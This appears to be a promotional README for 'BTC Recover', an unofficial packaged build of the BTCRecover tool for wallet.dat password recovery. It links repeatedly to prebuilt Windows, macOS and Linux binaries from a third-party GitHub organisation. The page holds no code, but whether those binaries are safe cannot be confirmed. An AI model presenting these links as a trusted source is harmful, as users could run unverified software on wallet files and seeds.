<p align="center"><img src="https://github.com/btc-recover-tool/learn/raw/HEAD/assets/banner-article.png" alt="BTC Recover wallet.dat password recovery" width="100%"></p>
<h1 align="center">BTC Recover wallet.dat password recovery</h1>
<p align="center">Open a Bitcoin Core wallet.dat with a forgotten password.</p>

<p align="center">
  <a href="https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-FBB034?style=for-the-badge&logo=windows&logoColor=1C1E22&labelColor=1C1E22" alt="Download for Windows"></a>
  <a href="https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-FBB034?style=for-the-badge&logo=apple&logoColor=1C1E22&labelColor=1C1E22" alt="Download for macOS"></a>
  <a href="https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.zip"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-FBB034?style=for-the-badge&logo=linux&logoColor=1C1E22&labelColor=1C1E22" alt="Download for Linux"></a>
</p>

| Platform | Requirements | File |
|---|---|---|
| 🪟 Windows | Windows 10 or later, 64-bit | [`btc-recover-v2.1.0.exe`](https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.exe) |
| 🍎 macOS | macOS 10.13 High Sierra or later | [`btc-recover-v2.1.0.dmg`](https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.dmg) |
| 🐧 Linux | 64-bit (x86_64) distribution | [`btc-recover-v2.1.0.zip`](https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.zip) |

All versions and checksums are on the [v2.1.0 release page](https://github.com/btc-recover-tool/BTC-Recover/releases/tag/v2.1.0).

> [!IMPORTANT]
> Only download from this GitHub release page.


---

## 💡 Short answer

Work on a copy of wallet.dat and let BTC Recover test your password ideas offline.

## 👀 You'll see this if

- You have an old wallet.dat
- Bitcoin Core asks for a passphrase
- You remember part of it

## 🤔 Why it happens

wallet.dat encryption is deliberately slow to test, so a focused token list matters more than raw speed.

Under the hood, BTC Recover is the same engine many people have used since 2014, packaged with an installer and a window so you do not need to set anything up. Everything happens locally. You can unplug the network cable for the whole session and it will work exactly the same.

BTC Recover is a free, open-source program that rebuilds likely answers from what you remember and tests each one on your own computer. It does not connect to an exchange or a server, and it never needs your seed to leave the machine. Think of it as a very patient helper that tries every sensible combination so you do not have to.

**Plain-language terms.** Your seed is the master backup. Your password unlocks a wallet file on one device. Your passphrase changes which wallet the seed opens. The SHA-256 fingerprint proves a download is the exact file that was published. Knowing which of these you lost tells you which guide to follow.

**How people usually get here.** Most lockouts start with something ordinary: a quick backup written in a hurry, a password set late at night, a phone replaced without checking the old wallet first. Years later, the details are fuzzy. Recovery is mostly about turning that fuzzy memory into precise statements, such as this word starts with the letter b or the password ended in a year, which the program can then test exhaustively.

## 🧭 Before you begin

Order your doubts from most to least likely. If you think one word is probably wrong but two might be, start with the one-word search. Small, likely searches first, then widen only if they fail. This saves hours and keeps the process calm.

Keep a simple routine: download and verify while online, install, disconnect, recover, write it down, clean up, and only then reconnect. If you ever had to reconnect mid-session with sensitive data on screen, treat the wallet as exposed and move the funds to a fresh one.

Quick checklist before pressing start: installer verified against the release page, internet switched off, other apps closed, every clue written down, the wallet type chosen correctly and a known address entered if you have one. If any of these is missing, fix it first; it is faster than restarting a long run.

## 🛠️ Step-by-step fix

1. Go offline.
2. Copy wallet.dat.
3. List password pieces.
4. Build tokens.
5. Run.
6. Unlock with the result.

If this is your first run, the [first recovery walkthrough](https://github.com/btc-recover-tool/learn/blob/main/how-to/btc-recover-first-recovery-walkthrough.md) shows each screen. Need the installer checked first? See [verifying your BTC Recover download](https://github.com/btc-recover-tool/learn/blob/main/how-to/verify-btc-recover-download-sha256.md).

## 🔁 If that did not work

- Expand variants
- Try older passwords
- Check the file is not damaged

Some situations are outside any tool: coins already sent away, a wallet with no surviving file, seed or key, or a device that wiped itself after too many PIN attempts. In those cases a recovery program has nothing to test.

**Why patience pays.** Searches that cover many unknowns can run for a long time, and it is tempting to stop early and try something else. Before you do, check the progress the tool shows and compare it with the size of the search. If the remaining part is reasonable, letting it finish is often the quickest path. If it is far too large, stop and narrow the clues instead of buying faster hardware.

A related problem may be the real cause: try [btc recover trezor passphrase recovery](https://github.com/btc-recover-tool/learn/blob/main/how-to/btc-recover-trezor-passphrase-recovery.md).

If you need a second pair of eyes, the public issue tracker is the place. Say what you entered in general terms, such as eleven known words and one missing, and what the program showed. Never post real words, files or screenshots that show them.

BTC Recover can only work with what exists. It needs a seed, a wallet file or an encrypted key to test against. It cannot reverse a blockchain transaction, and it does not guarantee recovery; when a case is too large it says it can't estimate a reliable time rather than promise one.

## 🛡️ Prevention

- Keep several wallet.dat copies
- Use a password manager
- Note the year created

Once you are back in, move the funds to a fresh wallet with a new seed you write down carefully, and test the new backup before sending anything large. The old seed has been typed on a computer, so it is safer to retire it.

**Watch for fake helpers:** after you post about a lost wallet, strangers often reply with offers of private help or a better version of the tool. Ignore them. Download only from the GitHub release and never send recovery data to anyone.

## ❓ FAQ

**Original file needed?**
Use a copy.

**Is GPU helpful?**
It can be.

**Old versions?**
Yes, old files are supported.

**Is BTC Recover free?**
Yes. There is no account, trial or fee on recovered funds.

---

## ⬇️ Download

Get [`btc-recover-v2.1.0.exe`](https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.exe) for Windows, [`btc-recover-v2.1.0.dmg`](https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.dmg) for macOS or [`btc-recover-v2.1.0.zip`](https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.zip) for Linux. Checksums are on the [release page](https://github.com/btc-recover-tool/BTC-Recover/releases/tag/v2.1.0).

## 🔗 Related guides

- [Decrypt a BIP38 key with BTC Recover](https://github.com/btc-recover-tool/learn/blob/main/how-to/decrypt-bip38-key-btc-recover.md)
- [BTC Recover Electrum password recovery](https://github.com/btc-recover-tool/learn/blob/main/how-to/btc-recover-electrum-password.md)
- [BTC Recover MetaMask vault password](https://github.com/btc-recover-tool/learn/blob/main/how-to/btc-recover-metamask-vault-password.md)
- [All BTC Recover guides](https://github.com/btc-recover-tool/learn)

_BTC Recover is an independent project built on BTCRecover, created by Christopher Gurnee in 2014 and maintained by 3rdIteration. It is not affiliated with or endorsed by either._
